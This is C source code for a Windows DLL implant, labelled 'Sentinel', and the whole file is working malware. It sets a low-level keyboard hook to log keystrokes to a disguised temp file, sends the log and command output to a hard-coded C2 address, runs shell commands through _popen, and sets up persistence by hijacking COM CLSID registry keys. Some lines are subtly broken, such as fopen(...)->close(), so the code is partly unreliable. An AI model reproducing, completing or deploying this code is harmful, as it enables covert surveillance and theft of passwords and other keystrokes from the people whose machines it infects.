#include <windows.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

// Configuration
#define C2_SERVER "192.168.1.100"
#define C2_PORT 443
#define SLEEP_INTERVAL 60000  // 1 minute
#define KEYLOG_FILE "C:\\Windows\\Temp\\system.log"

// Global variables
HHOOK hKeyboardHook = NULL;
HWND hiddenWindow = NULL;
SOCKET c2Socket = INVALID_SOCKET;

// Function prototypes
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
void StartKeylogger();
void StopKeylogger();
void SendKeylogData();
BOOL ConnectToC2();
void DisconnectFromC2();
void ExecuteCommand(const char* command);
void InstallPersistence();

// DllMain entry point
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            // Create hidden window for message loop
            hiddenWindow = CreateWindowA("STATIC", "", 0, 0, 0, 0, 0, NULL, NULL, hModule, NULL);
            if (hiddenWindow) {
                // Install persistence
                InstallPersistence();
                
                // Start keylogger
                StartKeylogger();
                
                // Connect to C2 server
                if (ConnectToC2()) {
                    // Send initial check-in
                    const char* checkin = "[+] Sentinel DLL implanted successfully\n";
                    send(c2Socket, checkin, strlen(checkin), 0);
                }
            }
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            StopKeylogger();
            DisconnectFromC2();
            if (hiddenWindow) DestroyWindow(hiddenWindow);
            break;
    }
    return TRUE;
}

// Keyboard hook procedure
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
        char key[256] = {0};
        
        // Get key state
        SHORT keyState = GetKeyState(VK_SHIFT);
        BOOL isShiftPressed = (keyState & 0x8000) != 0;
        
        // Convert virtual key to character
        if (pKeyBoard->vkCode >= 'A' && pKeyBoard->vkCode <= 'Z') {
            key[0] = isShiftPressed ? pKeyBoard->vkCode : tolower(pKeyBoard->vkCode);
        } else if (pKeyBoard->vkCode >= '0' && pKeyBoard->vkCode <= '9') {
            if (isShiftPressed) {
                char shiftKeys[] = {')', '!', '@', '#', '$', '%', '^', '&', '*', '('};
                key[0] = shiftKeys[pKeyBoard->vkCode - '0'];
            } else {
                key[0] = pKeyBoard->vkCode;
            }
        } else {
            switch (pKeyBoard->vkCode) {
                case VK_SPACE: key[0] = ' '; break;
                case VK_RETURN: strcpy(key, "[ENTER]\n"); break;
                case VK_BACK: strcpy(key, "[BACKSPACE]"); break;
                case VK_TAB: strcpy(key, "[TAB]"); break;
                case VK_CAPITAL: strcpy(key, "[CAPS_LOCK]"); break;
                case VK_SHIFT: strcpy(key, "[SHIFT]"); break;
                case VK_CONTROL: strcpy(key, "[CTRL]"); break;
                case VK_MENU: strcpy(key, "[ALT]"); break;
                case VK_DELETE: strcpy(key, "[DELETE]"); break;
                case VK_UP: strcpy(key, "[UP]"); break;
                case VK_DOWN: strcpy(key, "[DOWN]"); break;
                case VK_LEFT: strcpy(key, "[LEFT]"); break;
                case VK_RIGHT: strcpy(key, "[RIGHT]"); break;
                default: 
                    if (pKeyBoard->vkCode >= VK_NUMPAD0 && pKeyBoard->vkCode <= VK_NUMPAD9) {
                        key[0] = '0' + (pKeyBoard->vkCode - VK_NUMPAD0);
                    }
                    break;
            }
        }
        
        // Write to log file
        if (key[0] != 0) {
            FILE* logFile = fopen(KEYLOG_FILE, "a");
            if (logFile) {
                fwrite(key, 1, strlen(key), logFile);
                fclose(logFile);
            }
        }
        
        // Send keylog data to C2 periodically
        static DWORD lastSendTime = 0;
        DWORD currentTime = GetTickCount();
        if (currentTime - lastSendTime > SLEEP_INTERVAL) {
            SendKeylogData();
            lastSendTime = currentTime;
        }
    }
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

// Start keylogger
void StartKeylogger() {
    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
}

// Stop keylogger
void StopKeylogger() {
    if (hKeyboardHook) {
        UnhookWindowsHookEx(hKeyboardHook);
        hKeyboardHook = NULL;
    }
}

// Send keylog data to C2
void SendKeylogData() {
    FILE* logFile = fopen(KEYLOG_FILE, "r");
    if (logFile && c2Socket != INVALID_SOCKET) {
        fseek(logFile, 0, SEEK_END);
        long fileSize = ftell(logFile);
        fseek(logFile, 0, SEEK_SET);
        
        if (fileSize > 0) {
            char* buffer = (char*)malloc(fileSize + 1);
            if (buffer) {
                fread(buffer, 1, fileSize, logFile);
                buffer[fileSize] = 0;
                
                send(c2Socket, buffer, fileSize, 0);
                free(buffer);
            }
            
            // Clear log file
            fclose(logFile);
            fopen(KEYLOG_FILE, "w")->close();
        } else {
            fclose(logFile);
        }
    }
}

// Connect to C2 server
BOOL ConnectToC2() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return FALSE;
    }
    
    c2Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (c2Socket == INVALID_SOCKET) {
        WSACleanup();
        return FALSE;
    }
    
    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, C2_SERVER, &serverAddr.sin_addr);
    
    if (connect(c2Socket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        closesocket(c2Socket);
        WSACleanup();
        return FALSE;
    }
    
    return TRUE;
}

// Disconnect from C2
void DisconnectFromC2() {
    if (c2Socket != INVALID_SOCKET) {
        closesocket(c2Socket);
        c2Socket = INVALID_SOCKET;
        WSACleanup();
    }
}

// Execute system command
void ExecuteCommand(const char* command) {
    char output[4096] = {0};
    FILE* pipe = _popen(command, "r");
    if (pipe) {
        while (fgets(output, sizeof(output), pipe) != NULL) {
            if (c2Socket != INVALID_SOCKET) {
                send(c2Socket, output, strlen(output), 0);
            }
        }
        _pclose(pipe);
    }
}

// Install persistence via COM hijacking
void InstallPersistence() {
    // Hijack Wscript.Shell
    HKEY hKey;
    if (RegCreateKeyEx(HKEY_LOCAL_MACHINE, 
        "SOFTWARE\\Classes\\CLSID\\{72C24DD5-D70A-438B-8A42-98424B88AFB8}\\InprocServer32", 
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        
        char dllPath[MAX_PATH];
        GetModuleFileName(NULL, dllPath, sizeof(dllPath));
        
        RegSetValueEx(hKey, NULL, 0, REG_SZ, (BYTE*)dllPath, strlen(dllPath) + 1);
        RegSetValueEx(hKey, "ThreadingModel", 0, REG_SZ, (BYTE*)"Apartment", 9);
        RegCloseKey(hKey);
    }
    
    // Hijack Text Preview Handler
    if (RegCreateKeyEx(HKEY_LOCAL_MACHINE, 
        "SOFTWARE\\Classes\\CLSID\\{89BCB740-6119-101A-BCB7-00DD010655AF}\\InprocServer32", 
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        
        char dllPath[MAX_PATH];
        GetModuleFileName(NULL, dllPath, sizeof(dllPath));
        
        RegSetValueEx(hKey, NULL, 0, REG_SZ, (BYTE*)dllPath, strlen(dllPath) + 1);
        RegSetValueEx(hKey, "ThreadingModel", 0, REG_SZ, (BYTE*)"Apartment", 9);
        RegCloseKey(hKey);
    }
}